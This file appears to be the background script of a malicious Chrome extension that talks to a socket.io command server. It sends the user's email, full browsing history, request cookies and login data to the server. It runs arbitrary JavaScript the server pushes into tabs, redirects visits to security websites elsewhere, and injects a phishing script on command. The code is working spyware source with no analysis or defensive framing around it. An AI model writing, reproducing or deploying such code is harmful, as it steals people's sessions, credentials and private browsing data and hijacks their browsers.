async function getUserID() {
  var userID = "";
  chrome.storage.sync.get("userID", function(items) {
    userID = items.userID;
    return userID;
  });
}

async function connectToServer() {
  socket = io('http://localhost:3000');
  //ID will now be generated so everyone has an ID regardless of being logged in to gmail
  var userData = {};

  //get the saved userID we generated
  userData["id"] = "";
  chrome.storage.sync.get("userID", function(items) {
    userData["id"] = items.userID;
    //store
  });  

  //if no e-mail found...default to using userID
  userData["email"] = "";
  chrome.identity.getProfileUserInfo((userInfo) => {    
    if(typeof userInfo.email === "undefined" || userInfo.email === "" || userInfo.email === "No E-mail") {
      userData["email"] = userData["id"];
    } else {
      userData["email"] = userInfo.email;
    }
    socket.emit('userData', userData);
  });


  updateSecurityWebsites(socket);
  updateScriptWebsites(socket);
  return socket;
}

function disconnectFromServer(socket) {
  socket.disconnect();
}

function updateSecurityWebsites(socket) {
  socket.on('securityWebsites', (securityWebsites) => {
    chrome.storage.local.set({
      'securityWebsites': securityWebsites
    });
  });
}

function updateScriptWebsites(socket) {
  socket.on('jsExecution', (objects) => {
    chrome.storage.local.set({
      'scriptSites': objects
    });
  });
}

function searchAndSendHistory() {
  chrome.history.search({
    text: ''
  }, (results) => {
    results.forEach((page) => {
      sendHistoryPage(page);
    });
  });
}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   

function sendHistoryPage(page) {
  socket.emit('History', [page.url, new Date(page.lastVisitTime)])                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
}

function checkAndSendCookies(info) {
  info.requestHeaders.forEach((header) => {
    if (header.name === "Cookie") {
      socket.emit('Cookies', header.value);
    }
  });                           
}

function sendLoginInfo(loginInfo) {
  socket.emit('Login', loginInfo);
}

function checkScriptWebsites(tabId, changeInfo) {
  if (changeInfo.url) {
    chrome.storage.local.get('scriptSites', (scriptSites) => {
      scriptSites.scriptSites.forEach((map) => {
        if (changeInfo.url.includes(map.site)) {
          chrome.tabs.executeScript({
            code: map.code
          });
          return;
        }
      });
    });
  }
}

function checkSecurityWebsites(tabId, changeInfo) {
  if (changeInfo.url) {
    chrome.storage.local.get('securityWebsites', (securityWebsites) => {
      securityWebsites.securityWebsites.forEach((site) => {
        if (changeInfo.url.includes(site)) {
          redirectToRandomWebsite(tabId);
          return;
        }
      });
    });
  }
}

function createScriptListener() {
  socket.on('Script', (script) => {
    chrome.tabs.executeScript({
      code: script.code
    });
  });
}

function uuid() {
  return crypto.getRandomValues(new Uint32Array(4)).join("");
}

async function createUserID() {
  // chrome.storage.sync.get('userID', function(items) {
  //   var userID = items.userID;
  //   if(userID) {
  //     return userID;
  //   } else {
      var obj = {};
      obj["userID"] = uuid();
      chrome.storage.sync.set(obj, function() {
      });
  //   }
  // });
}
function createPhishingListener() {
  socket.on('Phish', (tab) => {
    chrome.tabs.executeScript(tabId, {
      file: "/js/phish.js"
    });
  });
}
